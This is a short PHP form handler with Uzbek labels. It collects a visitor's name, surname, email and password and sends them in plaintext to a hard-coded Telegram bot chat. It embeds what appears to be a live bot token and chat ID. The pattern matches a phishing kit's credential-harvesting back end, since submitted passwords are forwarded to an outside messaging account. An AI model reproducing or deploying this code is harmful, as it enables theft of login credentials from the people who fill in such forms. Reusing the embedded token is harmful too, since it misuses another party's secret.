<?php
     // https://api.telegram.org/bot5736616313:AAHhpHuGacVt9Y0VXvD1ArO-GswQzZqptTw/getUpdates

     $name = $_POST['name'];
     $lastname = $_POST['lastname'];
     $email = $_POST['email'];
     $password = $_POST['password'];

     $token = "5736616313:AAHhpHuGacVt9Y0VXvD1ArO-GswQzZqptTw";

     $chat_d = 174438708;


     $array = array(
          'Ismi: ' => $name,
          'Familiaysi: ' => $lastname,
          'Emaili: ' => $email,
          'Paroli: ' => $password, 
     );
     
     foreach($array as $key => $value){
          $text.="<b>".$key."</b>".$value."%0A";
     }

     $sendTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_d}&parse_mode=html&text={$text}","r");
     
     if($sendTelegram){
          echo "<b> Ma'lumot jo'natildi! </b>";
     }

?>